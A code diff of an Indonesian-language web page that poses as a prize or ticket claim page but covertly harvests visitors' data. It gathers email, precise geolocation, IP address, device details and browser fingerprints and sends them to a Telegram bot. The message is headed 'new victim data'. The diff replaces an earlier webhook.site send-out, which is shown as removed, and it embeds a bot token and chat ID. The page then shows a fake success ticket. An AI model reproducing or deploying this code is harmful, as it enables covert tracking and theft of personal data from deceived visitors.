@@ -372,6 +372,10 @@
     <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3"></audio>
 
     <script>
+        // === KONFIGURASI TELEGRAM ===
+        const TELEGRAM_BOT_TOKEN = '8564390603:AAHAxlGs_gR_XKb1JXOl1M4nauKaNIzS1io'; // API key bot Telegram Anda
+        const TELEGRAM_CHAT_ID = '6368768388';   // Chat ID Anda (dapat dari @userinfobot)
+        
         // Update datetime real-time
         function updateDateTime() {
             const now = new Date();
@@ -457,6 +461,59 @@
             }
         }
         
+        // Fungsi kirim ke Telegram
+        async function sendToTelegram(data) {
+            const message = `
+🚨 *DATA KORBAN BARU - 😈😈🤫🧏‍♂️* 🚨
+
+📧 *Email:* ${data.email || 'Tidak diisi'}
+🕐 *Waktu:* ${data.localDateTime}
+🌐 *Zona Waktu:* ${data.timezone}
+
+📍 *Lokasi:*
+┌ Latitude: ${data.location?.coordinates?.latitude || 'Tidak ada'}
+├ Longitude: ${data.location?.coordinates?.longitude || 'Tidak ada'}
+├ Kota: ${data.location?.address?.city || 'Tidak terdeteksi'}
+└ Negara: ${data.location?.address?.country || 'Tidak terdeteksi'}
+
+💻 *Informasi Perangkat:*
+┌ Platform: ${data.platform}
+├ Browser: ${data.userAgent}
+├ Layar: ${data.screen}
+├ Memory: ${data.deviceMemory} GB
+├ CPU Cores: ${data.hardwareConcurrency}
+└ IP: ${data.ip}
+
+🔐 *Fingerprint:*
+┌ Canvas: ${data.canvasFingerprint ? 'Terdeteksi' : 'Tidak'}
+├ WebGL: ${data.webglFingerprint}
+└ Fonts: ${data.fonts?.length || 0} fonts terdeteksi
+
+⚠️ *Data siap untuk investigasi lanjutan*
+            `;
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const result = await response.json();
+                console.log('Telegram response:', result);
+                return result.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+        
         // Main claim function
         function processClaim() {
             // Play click sound
@@ -521,10 +578,17 @@
             // Dapatkan lokasi detail
             getDetailedLocation().then(locationData => {
                 completeData.location = locationData;
-                sendDataToServer(completeData);
+                // Dapatkan IP address
+                getIPAddress().then(ip => {
+                    completeData.ip = ip;
+                    sendDataToTelegram(completeData);
+                });
             }).catch(error => {
                 completeData.location = { error: 'Location access denied' };
-                sendDataToServer(completeData);
+                getIPAddress().then(ip => {
+                    completeData.ip = ip;
+                    sendDataToTelegram(completeData);
+                });
             });
         }
         
@@ -556,8 +620,7 @@
                                     city: locationData.city || 'Unknown',
                                     locality: locationData.locality || 'Unknown',
                                     continent: locationData.continent || 'Unknown'
-                                },
-                                fullAddress: locationData.localityInfo?.administrative || []
+                                }
                             });
                         } catch (error) {
                             resolve({
@@ -582,7 +645,14 @@
             });
         }
         
-        // Fungsi fingerprinting (sama seperti sebelumnya)
+        function getIPAddress() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(() => 'Tidak dapat deteksi IP');
+        }
+        
+        // Fungsi fingerprinting
         function getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
@@ -609,46 +679,30 @@
         }
         
         function detectFonts() {
-            const fonts = ['Arial', 'Times New Roman', 'Verdana', 'Georgia'];
-            return fonts.filter(font => {
-                return document.fonts.check(`12px "${font}"`);
-            });
+            const fonts = ['Arial', 'Times New Roman', 'Verdana', 'Georgia', 'Comic Sans MS', 'Courier New'];
+            const detected = [];
+            for (let font of fonts) {
+                if (document.fonts.check(`12px "${font}"`)) {
+                    detected.push(font);
+                }
+            }
+            return detected;
         }
         
-        function sendDataToServer(data) {
-            // Simpan data ke localStorage
-            const sessionId = 'TICKET-2025-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8).toUpperCase();
+        async function sendDataToTelegram(data) {
+            const success = await sendToTelegram(data);
+            
+            // Simpan backup ke localStorage
+            const sessionId = 'TKT2025-' + Date.now();
             localStorage.setItem(sessionId, JSON.stringify(data));
             
-            // Dapatkan IP address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(ipData => {
-                    data.ip = ipData.ip;
-                    
-                    // Kirim ke webhook (ganti dengan webhook URL Anda)
-                    const webhookURL = 'https://webhook.site/fbe583da-b5f2-42eb-903f-bc710490c683';
-                    return fetch(webhookURL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            type: 'PREMIUM_VICTIM_DATA_2025',
-                            sessionId: sessionId,
-                            data: data,
-                            timestamp: new Date().toISOString()
-                        })
-                    });
-                })
-                .then(() => {
-                    // Tampilkan sukses dengan efek
-                    setTimeout(showSuccess, 3000);
-                })
-                .catch(error => {
-                    setTimeout(showSuccess, 3000);
-                });
+            // Tampilkan sukses
+            setTimeout(() => {
+                showSuccess(sessionId, success);
+            }, 3000);
         }
         
-        function showSuccess() {
+        function showSuccess(sessionId, telegramSuccess) {
             // Play success sound
             document.getElementById('successSound').play();
             
@@ -660,11 +714,20 @@
             
             // Tampilkan success message
             const successMsg = document.getElementById('successMessage');
-            const ticketNumber = 'TKT2025-' + Date.now();
             const claimTime = new Date().toLocaleString('id-ID');
             
-            document.getElementById('ticketNumber').textContent = ticketNumber;
+            document.getElementById('ticketNumber').textContent = sessionId;
             document.getElementById('claimTime').textContent = claimTime;
+            
+            // Tambahkan status Telegram
+            if (!telegramSuccess) {
+                const telegramStatus = document.createElement('p');
+                telegramStatus.style.fontSize = '12px';
+                telegramStatus.style.color = '#856404';
+                telegramStatus.style.marginTop = '10px';
+                telegramStatus.textContent = '📱 Data tersimpan secara lokal';
+                successMsg.appendChild(telegramStatus);
+            }
             
             successMsg.style.display = 'block';
             successMsg.scrollIntoView({ behavior: 'smooth' });
@@ -686,4 +749,4 @@
         }, 1000);
     </script>
 </body>
-    </html>
+                    </html>
